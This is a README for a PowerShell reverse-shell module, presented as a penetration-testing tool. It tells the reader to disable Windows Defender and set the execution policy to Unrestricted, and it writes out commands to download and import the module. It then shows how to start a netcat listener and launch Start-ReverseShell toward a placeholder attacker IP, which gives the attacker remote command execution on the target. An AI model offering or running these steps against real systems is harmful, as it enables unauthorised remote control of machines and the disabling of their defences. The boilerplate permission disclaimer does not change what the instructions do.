# ReverseShell - PowerShell
# Author: okpalandev
# Version: 1.0
# Date: 2024-03-24

## Disclaimer
This script is designed for educational and penetration testing purposes only. Do not use this script on systems that you do not have permission to test. The author of this script is not responsible for any damage caused by the use of this script.

## Description
This script is a reverse shell that uses PowerShell to connect to a remote host. The script is designed to be run on the target machine and will connect back to the attacker's machine. The script can be run on any Windows machine that has PowerShell installed. The script will open a connection to the attacker's machine and allow the attacker to execute commands on the target machine. The script is designed to be used for penetration testing and should only be used on systems that you have permission to test.

## Usage
To use the script, you will need to modify the IP address and port number in the script to match the IP address and port number of the attacker's machine. You will also need to run the script on the target machine. Once the script is running on the target machine, it will connect back to the attacker's machine and allow the attacker to execute commands on the target machine.

## Installation
To install the script, you can download the script from the GitHub repository and save it to your local machine. You can then import the script into PowerShell and run the script on the target machine.

## Requirements
1) Disable Windows Defender Real Time Protection  or any other Antivirus 
2) Add to Policy Execution
3) Run a Terminal as Administrator

```powershell
PS C:\> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser 
``` 

## Example
```powershell
PS C:\> Invoke-WebRequest -Uri "https://raw.githubusercontent.com/okpalandev/PSModules/ReverseShell/ReverseShell.psm1" -OutFile "ReverseShell.psm1"
```

```powershell
PS C:\> Import-Module .\ReverseShell.psm1
```
Then on the attacker machine, you can listen for the connection using Netcat or any other tool that can listen for incoming connections on the specified port.

```bash
$ nc -lvp 4444
```
    
Finally, you can start the reverse shell on the target machine by running the following command:

```powershell
PS C:\> Start-ReverseShell -IPAddress "attacker_ip" -Port " 4444 " 
```



## License
This script is licensed under the MIT License. See the LICENSE file for more information.

